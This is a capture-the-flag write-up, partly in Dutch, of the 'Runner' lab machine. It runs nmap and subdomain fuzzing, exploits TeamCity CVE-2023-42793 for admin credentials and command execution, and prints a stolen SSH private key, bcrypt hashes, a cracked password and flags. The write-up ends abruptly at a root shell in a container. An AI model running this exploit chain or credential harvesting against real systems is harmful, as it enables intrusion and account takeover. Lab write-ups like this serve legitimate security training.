
# Initial Enumeration
## Port Scanning

### Full Port scan

As always, I will start with a full port scan. With this we will start to see what ports are open on this ip address.

```
┌──(kali㉿kali)-[~]
└─$ nmap 10.129.230.247    
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-22 03:42 CEST
Nmap scan report for 10.129.230.247
Host is up (0.017s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8000/tcp open  http-alt
```
### Detailed port scan

At the detailed port scan go to get more information from the host. 

```
┌──(kali㉿kali)-[~/HTB/runner]
└─$ nmap -p22,80,8000 -sCV 10.129.230.247      
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-22 03:43 CEST
Stats: 0:00:06 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 33.33% done; ETC: 03:43 (0:00:12 remaining)
Nmap scan report for 10.129.230.247
Host is up (0.040s latency).

PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp   open  http        nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://runner.htb/
8000/tcp open  nagios-nsca Nagios NSCA
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

# Fuzzing Subdomains

Als we gaan kijken naar de webpagina zal je kunnen zien dat we niet verder kunnen. Hiervoor ben ik nu dus de subdomains gaan fuzzen. Zoals je hieronder kunt zien heb ik het subdomain teamcity gevonden.

```
┌──(kali㉿kali)-[~/HTB/runner]
└─$ ffuf -u http://runner.htb -w /usr/share/seclists/Discovery/DNS/namelist.txt -H "Host:FUZZ.runner.htb" -ac 

teamcity                [Status: 401, Size: 66, Words: 8, Lines: 2, Duration: 476ms]
```

Als we deze nu gaan toevoegen aan de hosts file en daarna naar het subdomain gaan surfen kan je zien dat we teamcity version te zien krijgen. Ik zal nu dus gaan kijken naar een exploit voor deze versie. 

![[Pasted image 20251021223119.png]]

# Remote Code Execution

Ik ben de volgende exploit `CVE-2023-42793` gaan gebruiken. https://github.com/B4l3rI0n/CVE-2023-42793. Aan de hand van deze exploit kan je de username, password en token achterhalen. Deze kan je gaan gebruiken voor een Remote Code Execution uittevoeren of voor ook al in te gaan loggen op de teamcity login page.

```
──(kali㉿kali)-[~/HTB/runner/CVE-2023-42793]
└─$ python3 exploit.py -u http://teamcity.runner.htb

Token: eyJ0eXAiOiAiVENWMiJ9.OFFVMHgxVHZNMGgtV00xLThmSmp6RGlRY2lv.ZjQ4NjAyNTUtZGNkMy00OTBjLTlmNDgtNDkyYzlmYjBhNDlj
Token saved to ./token
Successfully exploited!
URL: http://teamcity.runner.htb
Username: admin.I2Du
Password: Password@123


┌──(kali㉿kali)-[~/HTB/runner/test/CVE-2023-42793]
└─$ python3 CVE-2023-42793.py -u http://teamcity.runner.htb
[+] http://teamcity.runner.htb/login.html [H454NSec1927:@H454NSec]
```

Zoals je hieronder kunt zien ben ik door de exploit een rce connectie gaan maken met de server. Hierbij ben ik de user tcuser. Op het eerste zicht niets speciaals gevoden. Daarna ben ik gaan kijken of dat er in de config van de projecten gaan ssh key zat, en zoals je hieronder kunt zien hebben we een ssh key gevonden.

```
<r/config/projects/AllProjects/pluginData/ssh_keys$ ls
ls
id_rsa
<r/config/projects/AllProjects/pluginData/ssh_keys$ cat id_rsa
cat id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
KgK8c9z2ecgZsAAAALam9obkBydW5uZXI=
-----END OPENSSH PRIVATE KEY-----
```

Ik ben deze gaan nemen en op mijn eigen machine gaan zetten. Ik ben het ssh-keygen commando gaan gebruiken voor de username te achterhalen van de id_rsa key.

```
3072 SHA256:YBrlVeYeOPwQhNizkxaVtrtBTlLZ2/T5XBekbmDbEL4 john@runner (RSA)
```

Ik zal nu dus door gebruik te maken van het ssh commando en de id_rsa key inloggen als de gebruiker john.

```
┌──(kali㉿kali)-[~/HTB/runner]
└─$ sudo ssh john@runner.htb -i id_rsa
//
john@runner:~$ 
```

Hier vinden we de user flag.

```
john@runner:~$ cat user.txt 
4c734fa2783f961be54f208df50df367
```

Als we gaan kijken naar de hosts file kan je zien dat er een subdomain `portainer-administration.runner.htb` noemt. Wat als we nu door portforwarding de webpagina gaan opspinnen, kunnen we ernaar surfen. Maar als eerst zullen we de poort moeten weten. Dit kan je gaan doen door het volgende commando te gebruiken.

```
john@runner:~$ ss -tuln
Netid      State       Recv-Q      Send-Q           Local Address:Port           Peer Address:Port     Process     
udp        UNCONN      0           0                127.0.0.53%lo:53                  0.0.0.0:*                    
udp        UNCONN      0           0                      0.0.0.0:68                  0.0.0.0:*                    
tcp        LISTEN      0           4096             127.0.0.53%lo:53                  0.0.0.0:*                    
tcp        LISTEN      0           4096                 127.0.0.1:5005                0.0.0.0:*                    
tcp        LISTEN      0           511                    0.0.0.0:80                  0.0.0.0:*                    
tcp        LISTEN      0           128                    0.0.0.0:22                  0.0.0.0:*                    
tcp        LISTEN      0           4096                 127.0.0.1:9000                0.0.0.0:*                    
tcp        LISTEN      0           4096                 127.0.0.1:9443                0.0.0.0:*                    
tcp        LISTEN      0           4096                 127.0.0.1:8111                0.0.0.0:*                    
tcp        LISTEN      0           511                       [::]:80                     [::]:*                    
tcp        LISTEN      0           128                       [::]:22                     [::]:*                    
tcp        LISTEN      0           4096                         *:8000                      *:*  
```

Voor de rest kom ik niet meer vinden op de server. Ik ben nu dus in gaan loggen op de teamcity.runner.htb login page. Door de login gegevens van Remote Code Execution te gaan gebruiken, kan je gaan inloggen op de login page. 

Hier kan je bij de backup http://teamcity.runner.htb/admin/admin.html?item=backup, de TeamCity_backup maken en daar kan je zien dat je een backup.zip file kunt downloaden.

![[Pasted image 20251022195058.png]]

Als we de zip file gaan downloaden kan je zien dat er een database dump directory is. Binnen deze directory heb je een users file. Hierin zitten de verschillende users en hun hashes. Ik zal deze gaan cracken door gebruik te maken van john.

```
ID, USERNAME, PASSWORD, NAME, EMAIL, LAST_LOGIN_TIMESTAMP, ALGORITHM
1, admin, $2a$07$neV5T/BlEDiMQUs.gM1p4uYl8xl8kvNUo4/8Aja2sAWHAQLWqufye, John, john@runner.htb, 1761154755242, BCRYPT
2, matthew, $2a$07$q.m8WQP8niXODv55lJVovOmxGtg6K/YPHbD48/JQsdGLulmeVo.Em, Matthew, matthew@runner.htb, 1709150421438, BCRYPT
11, h454nsec1927, $2a$07$efQaKZi00Co0qig9DuOTz.iB7BVohcURVbWMgQxI.D7bRjmEg3h6., , "", 1761154776391, BCRYPT
```

Zoals je hieronder kunt zien heb ik het password `piper123` gevonden. Ik ben dit gaan testen en dit is het password van de user matthew. We kunnen deze usercredentials gaan gebruiken voor op de portainer-administration.runner.htb webpagina in te loggen.


```
root@61d5a99bda99:.# ls
job-working-directory: error retrieving current directory: getcwd: cannot access parent directories: No such file or directory
cgroup.controllers      cgroup.subtree_control  cpuset.mems.effective  io.cost.qos       memory.pressure                sys-kernel-config.mount
cgroup.max.depth        cgroup.threads          dev-hugepages.mount    io.pressure       memory.stat                    sys-kernel-debug.mount
cgroup.max.descendants  cpu.pressure            dev-mqueue.mount       io.prio.class     misc.capacity                  sys-kernel-tracing.mount
cgroup.procs            cpu.stat                init.scope             io.stat           proc-sys-fs-binfmt_misc.mount  system.slice
cgroup.stat             cpuset.cpus.effective   io.cost.model          memory.numa_stat  sys-fs-fuse-connections.mount  user.slice
root@61d5a99bda99:.# cd ..
chdir: error retrieving current directory: getcwd: cannot access parent directories: No such file or directory
root@61d5a99bda99:..# ls
bpf  btrfs  cgroup  ecryptfs  ext4  fuse  pstore
root@61d5a99bda99:..# ls
bpf  btrfs  cgroup  ecryptfs  ext4  fuse  pstore
root@61d5a99bda99:..# cd ..
root@61d5a99bda99:../..# ls
bin  boot  data  dev  etc  home  lib  lib32  lib64  libx32  lost+found  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var
root@61d5a99bda99:../..# cd root
root@61d5a99bda99:../../root# ls
docker_clean.sh  initial_state.txt  monitor.sh  root.txt
root@61d5a99bda99:../../root# cat root.txt
5358fde72cecaeb5c907dd34f3ccc846
```